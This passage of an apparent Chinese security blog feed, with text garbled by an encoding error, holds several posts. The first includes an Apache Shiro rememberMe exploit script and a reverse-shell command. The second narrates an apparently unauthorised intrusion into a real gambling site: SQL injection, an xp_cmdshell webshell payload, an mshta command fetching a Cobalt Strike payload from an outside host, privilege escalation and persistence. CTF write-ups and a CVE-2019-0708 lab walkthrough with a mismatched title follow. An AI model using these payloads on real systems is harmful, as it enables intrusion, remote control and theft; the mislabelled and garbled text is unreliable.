class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    <span class="comment"># å¯†é’¥ä½¿ç”¨æ£€æµ‹æˆåŠŸçš„å¯†é’¥</span></span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">python2 shiro_exp.py <span class="number">10.228</span><span class="number">.11</span><span class="number">.159</span>:<span class="number">6666</span> æ„æ€æ˜¯æŠŠshellåå¼¹åˆ°vsp(ä½ çš„æœ¬æœº)ä¸Šçš„<span class="number">6666</span>ç«¯å£</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3077247030.png"></p><p>burpè¯·æ±‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1255460863.png"></p><p>æˆåŠŸè·å–shell</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/920891601.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiroååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°å½•æŸåšå½©ç½‘ç«™æ¸—é€</title>
      <link href="2020/12/05/%E8%AE%B0%E5%BD%95%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"/>
      <url>2020/12/05/%E8%AE%B0%E5%BD%95%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>æœ€åˆï¼Œæˆ‘å¾—åˆ°çš„åªæœ‰ä¸€ä¸ªåå°ç½‘å€ï¼Œæ·±æ·±å¸äº†å£çƒŸï¼Œå¯æ”»å‡»ç‚¹å¤ªå°‘äº†ã€‚<br>å¦‚æœæ²¡æœ‰å¼±å£ä»¤ï¼Œæ³¨å…¥ï¼Œå’Œç›´æ¥rceçš„ç‚¹ï¼Œæ˜¯å¾ˆéš¾æ‰“å¼€ç¼ºå£çš„<br>æ‰€ä»¥é¦–å…ˆç¬¬ä¸€æ­¥è¦åšçš„äº‹æƒ…è¿›è¡Œä¿¡æ¯æœé›†äº†ï¼<br>æ¸—é€çš„æœ¬è´¨æ˜¯ä¿¡æ¯æ”¶é›†çš„<br>åœ¨ç½‘ç»œç©ºé—´å®‰å…¨æœç´¢å¼•æ“fofaä¸ŠæŸ¥è¯¢ä¸€ä¸‹ï¼Œå†å°±æ˜¯ç«¯å£æ‰«æ ï¼Œç›´æ¥ç•¥è¿‡ï¼Œæ‡‚çš„éƒ½æ‡‚ã€‚<br>æœ‰åˆ©ç”¨ä»·å€¼çš„ç«¯å£ï¼š80,81,1433,3389<br>è„†å¼±ç‚¹ï¼š<a href="http://49.xxx.xx.xxx/">http://49.xxx.xx.xxx</a>:81/Login/index<br>ä½†æ˜¯é€šè¿‡ä¸€æ®µå¸¸è§„æ“ä½œæ“ä½œåï¼Œå‘ç°åå°ç™»å½•ç•Œé¢å­˜åœ¨å †å æ³¨å…¥ï¼<br>ä¸”è·å¾—å¦‚ä¸‹ä¿¡æ¯ï¼š<br>SQLæ³¨å…¥poståŒ…(åœ¨å“åº”åŒ…ä¸­å¾—åˆ°ASP.NET+Microsoft-IIS/7.5)<br>æƒé™ï¼šSA</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/334607215.png"></p><p>åˆšå¼€å§‹å¾—åˆ°æ³¨å…¥å°±æƒ³ç€è¿›å…¥åå°çœ‹çœ‹ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œå°±è‚äº†ä¸€æ®µæ—¶é—´çš„pyè„šæœ¬ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2145323975.png"></p><p>å¾—åˆ°å¯†ç è¿›å…¥åå°ï¼Œæ¨¡æ¿åƒç¯‡ä¸€å¾‹ï¼Œæ— æ•°æ®å¤‡ä»½ï¼Œæ— ä¿®æ”¹æ¨¡æ¿ï¼Œä¸Šä¼ ä¸ªäººåˆ¤æ–­åŸºäºç™½åå•ï¼Œæœ‰ç¼–è¾‘å™¨ä¸è¿‡ç¤ºä¾‹ä»£ç å·²åˆ é™¤ï¼Œç•™è¨€æ¿ä¸å¯ç•™è¨€ï¼Œå›è¿‡å¤´æ¥åˆçœ‹æ³¨å…¥ï¼Œæ—¢ç„¶æ˜¯å †å æ³¨å…¥ï¼Œé‚£å°±å¯ä»¥æ‰§è¡ŒSQLè¯­å¥ï¼Œç„¶åä¸€é¡¿æ“ä½œï¼Œå—¯å—¯å—¯â€¦ æ²¡æœ‰å›æ˜¾ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1251178843.png"></p><p>ä»¥ä¸ºåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œæ²¡æƒ³åˆ° 3389ç«¯å£ç™»å½•å¤±è´¥ï¼Œ1433ç«¯å£è¿æ¥å¤±è´¥ï¼è¿™é‡Œæˆ‘å¾ˆæ‡µï¼Œç»è¿‡å¤§ä½¬çš„ä¸€ç•ªæŒ‡å¯¼ï¼Œå¯ä»¥æŠŠæ³¨å…¥ä¿¡æ¯é€šè¿‡å¤–å¸¦DNSLlogï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨xp_cmdshellæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯å¦å¼€å¯ï¼Œæ‰€æœ‰å°è¯•äº†ä¸€ä¸‹pingä»¥ä¸‹dnslog,è¿˜å¥½å‰å‡ å¤©è¡¥è¿‡ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1861135234.png"></p><p>æ—¢ç„¶dnslogæœ‰å›æ˜¾ï¼Œé‚£å°±è¯æ˜xp_cmdshelæ‰©å±•å¼€å¯ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œä¸¤ç§æ€è·¯:<br>ç¬¬ä¸€ç§æ˜¯cmdæ‰§è¡Œå‘½ä»¤ï¼Œè¾“å‡ºåˆ°ç½‘ç«™æ ¹ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;exec masterâ€¦xp_cmdshell â€˜echo ^&lt;%@ Page Language&#x3D;â€œJscriptâ€%&gt;&lt;%eval(Request.Item[â€œpassâ€],â€œunsafeâ€);%^&gt; &gt; c:\ç½‘ç«™è·¯å¾„\shell.aspxâ€™;â€“</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘çˆ†ä¸å‡ºæ¥ç»å¯¹è·¯å¾„å°±é‡‡ç”¨äº†ç¬¬äºŒç§æ–¹æ³•<br>ç¬¬äºŒç§æ˜¯ä¸‹è½½æœ¨é©¬ï¼Œè¿è¡Œæœ¨é©¬ç›´æ¥ä¸Šçº¿<br>csè®¾ç½®å¥½ç›‘å¬å™¨ï¼Œç”Ÿæˆä¸€ä¸ªhtml applicationæ–‡ä»¶ï¼Œç„¶åä¸Šä¼ åˆ°csæœåŠ¡å™¨ä¸Š<br>åœ¨æ³¨å…¥ç‚¹æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;; exec master.dbo.xp_cmdshell â€˜mshta http:&#x2F;&#x2F;39.xx.xxx.xxx:80&#x2F;download&#x2F;file.extâ€™; â€“</span><br></pre></td></tr></table></figure><p>è¿‡ä¸€ä¼šå„¿æœ‰å°ä¸»æœºä¸Šçº¿äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2532348242.png"></p><p>è¡¥ä¸å®‰è£…200å¤šï¼Œè¾ƒå¤šï¼ŒæŠŠsysteminfoä¸­çš„ä¿¡æ¯æ¼æ´å¯¹æ¯”ï¼Œçœ‹æœ‰æ²¡æœ‰æ¼è¡¥çš„ï¼Œå‘ç°å¯åˆ©ç”¨æ¼æ´ms16-075<br>systeminfo | findstr KB3164038<br><a href="https://github.com/vysecurity/reflectivepotato.git">https://github.com/vysecurity/reflectivepotato.git</a> githubä¸Šè¯¥expçš„cnaæ’ä»¶ï¼ŒåŠ è½½åˆ°è„šæœ¬ç®¡ç†å™¨ä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/370159021.png"></p><p>æˆ‘è¿™é‡Œç›´æ¥åˆ›å»ºç®¡ç†å‘˜ï¼Œä½†æ˜¯æ›´éšè”½çš„æ–¹æ³•æ˜¯é€šè¿‡mimikatzè¯»å–hashæˆ–è€…SSPè·å–æ˜æ–‡å¯†ç ï¼Œæ¥è·å–æŒä¹…æ§åˆ¶ï¼Œæˆ–è€…åˆ©ç”¨è®¡åˆ’ä»»åŠ¡ï¼Œè¿‡ä¸€æ®µæ—¶é—´åå¼¹shellå›æ¥ï¼</p><p>æ¸—é€æœ¬å°±æ˜¯é€†å¤©è€Œè¡Œï¼</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç™½å«–çœŸé¦™ç³»åˆ—-pwnä¸ªäººä¸“ç”¨è™šæ‹Ÿæœºåˆ†äº«</title>
      <link href="2020/11/25/%E7%99%BD%E5%AB%96%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-pwn%E4%B8%AA%E4%BA%BA%E4%B8%93%E7%94%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%86%E4%BA%AB/"/>
      <url>2020/11/25/%E7%99%BD%E5%AB%96%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-pwn%E4%B8%AA%E4%BA%BA%E4%B8%93%E7%94%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<p><strong>è¿˜åœ¨ä¸ºè‹¦è‹¦ä¸ºæ­pwnç¯å¢ƒè€Œå‘æ„å—ï¼Ÿè¿˜åœ¨ä¸ºç¯å¢ƒé”™è¯¯å¯¼è‡´æ— æ³•æ›´å¥½pwnè€Œè‹¦æ¼å—ï¼Ÿé‚£ä¹ˆç°åœ¨ä½ çš„ç¦åˆ©æ¥äº†ï¼Œä¸ªäººä¸“ç”¨pwnè™šæ‹Ÿæœºå®ƒæ¥äº†ï¼Œç¯å¢ƒå·²ç»å¤‡å¥½ï¼Œä½ å‡†å¤‡ç™½å«–äº†å—ï¼Ÿ</strong></p><blockquote><p>è™šæ‹Ÿæœºç¯å¢ƒé…ç½®æƒ…å†µ<br>1.ubuntu18.0.4<br>2.gdb+æ’ä»¶<br>3.wine+IDA7.0<br>4.pwntools+python2<br>5.nasm<br>6.Libc-database<br>7.LibcSearcher<br>8.ä¸€å¼ ç²¾ç¾çš„å£çº¸</p></blockquote><h1 id="è™šæ‹Ÿæœºé¢„è§ˆ"><a href="#è™šæ‹Ÿæœºé¢„è§ˆ" class="headerlink" title="è™šæ‹Ÿæœºé¢„è§ˆ"></a>è™šæ‹Ÿæœºé¢„è§ˆ</h1><p>ä¸»ç•Œé¢</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3074059537.png"></p><p>gdbç•Œé¢</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3120056197.png"></p><p>IDAç•Œé¢</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3735507374.png"></p><h1 id="åˆ†äº«è™šæ‹Ÿæœºè¯´æ˜"><a href="#åˆ†äº«è™šæ‹Ÿæœºè¯´æ˜" class="headerlink" title="åˆ†äº«è™šæ‹Ÿæœºè¯´æ˜"></a>åˆ†äº«è™šæ‹Ÿæœºè¯´æ˜</h1><p>æ­¤è™šæ‹Ÿæœºæ²¡æœ‰ä»»ä½•ä½œè€…ä¸ªäººçš„ä¸œè¥¿åœ¨é‡Œé¢ï¼ŒåŸºç¡€ç¯å¢ƒæ²¡æœ‰é—®é¢˜ï¼Œåç»­éœ€è¦ä»€ä¹ˆå·¥å…·è‡ªè¡Œæ·»åŠ ï¼Œå®Œå…¨å¯æ ¹æ®è‡ªå·±éœ€æ±‚è¿›è¡Œå®šåˆ¶åŒ–ï¼</p><blockquote><p><strong>è™šæ‹Ÿæœºç™»å½•å¯†ç ï¼šroot</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹è½½åœ°å€ï¼š</span><br><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1MICtzBZ0fpYrsDmZAXHwgQï¼ˆæå–ç ï¼širqkï¼‰</span><br><span class="line">å‹ç¼©åŒ…å¯†ç è·å–æ–¹å¼ï¼š</span><br><span class="line">å…³æ³¨Gammaå®‰å…¨å®éªŒå®¤ï¼Œå‘é€æ¶ˆæ¯â€œpwnè™šæ‹Ÿæœºâ€</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-å¤§å‰å¤§åˆ©æ¯&amp;&amp;â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ› 2021</title>
      <link href="2020/11/24/2020HECTF&amp;%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
      <url>2020/11/24/2020HECTF&amp;%E7%A5%A5%E4%BA%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="HECTF"><a href="#HECTF" class="headerlink" title="HECTF"></a>HECTF</h1><h2 id="ã€çœŸç­¾åˆ°é¢˜ã€‘å¿«æ¥çœ‹ç›´æ’­å•¦"><a href="#ã€çœŸç­¾åˆ°é¢˜ã€‘å¿«æ¥çœ‹ç›´æ’­å•¦" class="headerlink" title="ã€çœŸç­¾åˆ°é¢˜ã€‘å¿«æ¥çœ‹ç›´æ’­å•¦~"></a>ã€çœŸç­¾åˆ°é¢˜ã€‘å¿«æ¥çœ‹ç›´æ’­å•¦~</h2><blockquote><p>å‰å¾€ç›´æ’­é—´ï¼Œè°ƒæˆå°è“è“è·å–flagã€‚<br>æ³¨ï¼šæœ¬é¢˜è¡°å‡æé™å°†ä¸º100<br><a href="https://live.bilibili.com/6789627">https://live.bilibili.com/6789627</a></p></blockquote><p>Bç«™ç›´æ’­å±å¹•å³å¯çœ‹åˆ°flag</p><h2 id="ã€The-Endã€‘ä¸–ç•Œçš„ç»ˆç„‰"><a href="#ã€The-Endã€‘ä¸–ç•Œçš„ç»ˆç„‰" class="headerlink" title="ã€The Endã€‘ä¸–ç•Œçš„ç»ˆç„‰"></a>ã€The Endã€‘ä¸–ç•Œçš„ç»ˆç„‰</h2><blockquote><p>ç»ˆäºï¼Œä½ æ¥åˆ°äº†æœ¬æ¬¡HECTFçš„å°½å¤´<br>çªç„¶ä¸€ä¸ªèƒŒç€å¤§æ¿å­çš„åœ°ç²¾è·³äº†å‡ºæ¥ï¼éªšå¹´ï¼ç•™ä¸ªè¨€å—ï¼<br><a href="http://traceability.ctftraining.cn/jq/98289565.aspx">http://traceability.ctftraining.cn/jq/98289565.aspx</a></p></blockquote><p>å¡«é—®å·å¾—flag</p><h2 id="png"><a href="#png" class="headerlink" title="png"></a>png</h2><blockquote><p>å¥½å¯çˆ±çš„å°çŒ«å’ªé¸­~</p><p><a href="https://pan.baidu.com/s/1sRaqAArQIVDOOM9SoFHuSg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š9qi0ï¼‰</p></blockquote><p>æœ¬é¢˜flagåˆ†ä¸¤éƒ¨åˆ†ï¼šä¿®æ”¹å›¾ç‰‡é«˜åº¦ + 010æ‰“å¼€å°¾éƒ¨base64</p><p>ç¬¬ä¸€æ­¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4069440216.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1543670602.png"></p><p>ç¬¬äºŒæ­¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1893160869.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1748197943.png"></p><p>æœ€åç»„åˆå¾—åˆ°flagï¼šflag{94ed7fdae8f504743b79bdf8fcfd55fd}</p><h2 id="ä¸è¯´äººè¯"><a href="#ä¸è¯´äººè¯" class="headerlink" title="ä¸è¯´äººè¯"></a>ä¸è¯´äººè¯</h2><blockquote><p>é˜´é˜³æ€ªæ°”ï¼Ÿï¼</p><p><a href="https://pan.baidu.com/s/1TXzELxVViDEh9trTcGk3rQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šgpo4ï¼‰</p></blockquote><p>.ã€ï¼Ÿã€ï¼å¾ˆæ˜æ˜¾å°±æ˜¯<a href="https://www.splitbrain.org/services/ook"><strong>brainfuck-Ookç¼–ç </strong></a><br>â€œ**.<strong>â€æ›¿æ¢â€œ</strong>Ook.<strong>â€ï¼›â€œ</strong>?<strong>â€æ›¿æ¢â€œ</strong>Ook?<strong>â€ï¼›â€œ</strong>!<strong>â€æ›¿æ¢â€œ</strong>Ook!**â€<br>è§£ç å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3387670304.png"></p><h2 id="æº¯æºï¼æº¯æºï¼æº¯æºï¼"><a href="#æº¯æºï¼æº¯æºï¼æº¯æºï¼" class="headerlink" title="æº¯æºï¼æº¯æºï¼æº¯æºï¼"></a>æº¯æºï¼æº¯æºï¼æº¯æºï¼</h2><blockquote><p>è®©æˆ‘ä»¬ä¸€èµ·æ¥æ„‰å¿«çš„æº¯æºå§~<br>æœ¬ç­”å·ä¸­æ¶‰åŠçš„æ‰€æœ‰æ‰‹æœºå·å‡ä¸ºéšæœºç”Ÿæˆçš„æ‰‹æœºå·ç ï¼Œæ‰€æœ‰å‚èµ›äººå‘˜åº”å½“ä»…å®Œæˆé¢˜ç›®ä¸­è¦æ±‚å³å¯ï¼Œä¸å…è®¸è¿›ä¸€æ­¥å¯¹æ‰‹æœºå·åšè¿›ä¸€æ­¥&gt; ç¤¾ä¼šå·¥ç¨‹æ”»å‡»ï¼Œç”±æ­¤é€ æˆçš„ä»»ä½•æ³•å¾‹è´£ä»»ç”±å‚èµ›äººå‘˜æ‰¿æ‹…ã€‚<br>é—®å·å¯†ç å³ä¸ºå‚èµ›è€…çš„åˆå§‹å‚èµ›å¯†ç ã€‚<br>æ¯ä½å‚èµ›è€…æœ‰5æ¬¡æŒ‘æˆ˜æœºä¼šï¼Œæ¯æ¬¡æŒ‘æˆ˜éœ€è¦åœ¨10åˆ†é’Ÿå†…æŒ‘æˆ˜å®Œæ¯•ã€‚ æ¯æ¬¡æŒ‘æˆ˜ç»“æŸï¼ŒæˆåŠŸçš„æŒ‘æˆ˜è€…å°†è·å¾—flagï¼Œå¤±è´¥çš„æŒ‘æˆ˜è€…ä¼šè·å¾—ä¸€æ¬¡æŠ½å¥–æœºä¼šï¼Œæœ‰1%çš„æ¦‚ç‡ç›´æ¥æŠ½ä¸­flagã€‚<br>æŒ‘æˆ˜é“¾æ¥ï¼š<a href="http://traceability.ctftraining.cn/jq/98028270.aspx">http://traceability.ctftraining.cn/jq/98028270.aspx</a></p></blockquote><p>é€šè¿‡å¤©çœ¼æŸ¥ã€è½¬è´¦ç­‰æ‰‹æ®µæ‰¾åˆ°æ‰€ç»™ä¿¡æ¯å¯¹åº”çš„å§“åï¼Œå…¬å¸<br>æœ€ç»ˆå¾—åˆ°flag</p><h2 id="babyMisc"><a href="#babyMisc" class="headerlink" title="babyMisc"></a>babyMisc</h2><blockquote><p>è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„misc<br>ä½ èƒ½å‘ç°å…¶ä¸­çš„ç§˜å¯†å—?<br>æ–‡ä»¶hexå°¾éƒ¨æœ‰ç¼–ç åçš„flagçš„åä¸¤ä½<br>flagæ ¼å¼:â€HECTF{}â€</p><p><a href="https://pan.baidu.com/s/1-WYInOhq-1-UseJK4hV-pQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šg3jjï¼‰</p><p>hint:PEä¹Ÿæƒ³æœ‰sessionï¼Ÿè¿™ä¹ˆå°å£°ä¹Ÿæƒ³æœ‰sessionï¼Ÿ</p></blockquote><p>æ ¹æ®é¢˜ç›®æç¤ºç”¨010æ‰“å¼€æŸ¥çœ‹hexå°¾éƒ¨å‘ç°å¯ç–‘å­—ç¬¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/340722991.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2723202087.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2635967460.png"></p><p>ylbnb Ã² Ã³ æœ€åå†åŠ ä¸Šzpï¼Œbase58è§£ç å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1316160874.png"></p><h1 id="ç¥¥äº‘æ¯"><a href="#ç¥¥äº‘æ¯" class="headerlink" title="ç¥¥äº‘æ¯"></a>ç¥¥äº‘æ¯</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><blockquote><p>ZmxhZ3txcV9ncm91cF84MjY1NjYwNDB9</p></blockquote><p>base64è§£ç å¾—åˆ°flag</p><p>æ²¡æ—¶é—´åšäº†<del>ä¹Ÿä¸å¤ªæƒ³å¤ç°</del>ï¼ˆæˆ‘æ˜¯æ‡’ç‹—.jpg</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HECTF </tag>
            
            <tag> ç¥¥äº‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudoå †æ ˆæº¢å‡ºæ¼æ´é¢„è­¦</title>
      <link href="2020/11/23/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/"/>
      <url>2020/11/23/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="01-æ¼æ´è¯¦æƒ…"><a href="#01-æ¼æ´è¯¦æƒ…" class="headerlink" title="01 æ¼æ´è¯¦æƒ…"></a>01 æ¼æ´è¯¦æƒ…</h1><p>Windowsç³»åˆ—æœåŠ¡å™¨äº2019å¹´5æœˆ15å·ï¼Œè¢«çˆ†å‡ºé«˜å±æ¼æ´ï¼Œè¯¥æ¼æ´å½±å“èŒƒå›´è¾ƒå¹¿ï¼Œæ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡è¿œç¨‹æ¡Œé¢ç«¯å£3389ï¼ŒRDPåè®®è¿›è¡Œæ”»å‡»çš„ã€‚è¿™ä¸ªæ¼æ´æ˜¯ä»Šå¹´æ¥è¯´å±å®³ä¸¥é‡æ€§æœ€å¤§çš„æ¼æ´ï¼Œè·Ÿä¹‹å‰çš„å‹’ç´¢ï¼Œæ°¸æ’ä¹‹è“ç—…æ¯’å·®ä¸å¤šã€‚</p><blockquote><p>å½±å“ç³»ç»Ÿï¼šwindows2003ã€windows2008ã€windows2008 R2ã€windows xp ã€win7</p></blockquote><h1 id="02-å·¥å…·åˆ†äº«"><a href="#02-å·¥å…·åˆ†äº«" class="headerlink" title="02 å·¥å…·åˆ†äº«"></a>02 å·¥å…·åˆ†äº«</h1><blockquote><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1NeaYWuIFoRs0xCHW4S_ntw">https://pan.baidu.com/s/1NeaYWuIFoRs0xCHW4S_ntw</a><br>æå–ç ï¼šn3zm</p></blockquote><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>æ”»å‡»æœºï¼škali IP: 10.1.8.167<br>é¶æœºï¼š win7 IP:10.1.8.8ï¼ˆå¼€æ”¾3389ç«¯å£ï¼‰</p><p>Win7é¶æœºå¼€å¯å’Œå…³é—­3389ç«¯å£</p><p>ï¼ˆ1ï¼‰å¼€å¯3389ç«¯å£ï¼š<br>åœ¨cmdå†…ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå³å¯å¼€å¯3389ç«¯å£ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å…³é—­3389ç«¯å£ï¼š<br>åœ¨cmdå†…ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå³å¯å…³é—­3389ç«¯å£ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3988915923.png"></p><h1 id="03-è“å±"><a href="#03-è“å±" class="headerlink" title="03 è“å±"></a>03 è“å±</h1><p>ä½¿ç”¨nmapå¯¹é¶æœºè¿›è¡Œæ‰«æï¼š</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2472977457.png"></p><p>ä½¿ç”¨æ¼æ´POCè¿›è¡Œæµ‹è¯•ï¼š<br>POCï¼š<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a><br>ç”¨æ³•ï¼špython3 crashpoc.py ipåœ°å€ ç³»ç»Ÿç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;n1xbyte&#x2F;CVE-2019-0708.git</span><br><span class="line">python3 crashpoc.py 10.1.8.8  64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/954211585.png"></p><p>é¶æœºå·²è“å±ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3559546570.png"></p><h1 id="04-åå¼¹shell"><a href="#04-åå¼¹shell" class="headerlink" title="04 åå¼¹shell"></a>04 åå¼¹shell</h1><blockquote><p><a href="https://github.com/biggerwing/CVE-2019-0708-poc">https://github.com/biggerwing/CVE-2019-0708-poc</a></p></blockquote><p>é…ç½®msfï¼Œå°†expæ”¾ç½®åˆ°msfå¯¹åº”æ–‡ä»¶å¤¹ä¸‹ï¼Œå¦‚æœåŒåç›´æ¥è¦†ç›–ï¼ˆè¿™é‡Œä»¥kaliä¸ºä¾‹ï¼‰</p><p><img 